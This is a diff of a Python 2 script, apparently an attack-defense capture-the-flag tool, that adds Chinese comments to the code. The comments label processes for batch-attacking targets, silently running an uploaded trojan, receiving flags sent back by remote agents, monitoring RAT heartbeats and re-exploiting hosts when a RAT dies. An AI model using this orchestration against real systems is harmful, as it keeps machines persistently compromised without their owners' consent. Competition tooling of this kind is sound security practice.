@@ -49,6 +49,8 @@ f.write(res)
     sel(cmd)
 
 
+
+#运行上传的木马
 def run(target):
     sel("python {target} 1>/dev/null 2>/dev/null".format(target=target))
 
@@ -212,10 +214,16 @@ initdb("./our.db")
 
 
 
+
+#批量攻击进程
 p_scan=Process(target=scan,args=(targets,))
+#监听反弹flag进程
 p_recv=Process(target=recv_server,args=())
+#监听RAT心跳
 p_heartbeat=Process(target=heartbeat)
+#监视数据库判断RAT是否存货，如果RAT挂了，自动打一发回去
 p_keepit=Process(target=keepit)
+#如果exploit失败了，那么还是每隔一段时间打过去
 p_stillattack=Process(target=fail_but_attack)
 
 tarlist=init_target_list(targets)
@@ -233,13 +241,17 @@ print "start listening...."
 
 
 p_scan.start()
-raw_input()
+# raw_input()
 p_recv.start()
 p_heartbeat.start()
 p_keepit.start()
 p_stillattack.start()
 
 sleep(1)
+
+
+
+#启动监视视图
 while 1:
     print "\n"*9
     try:
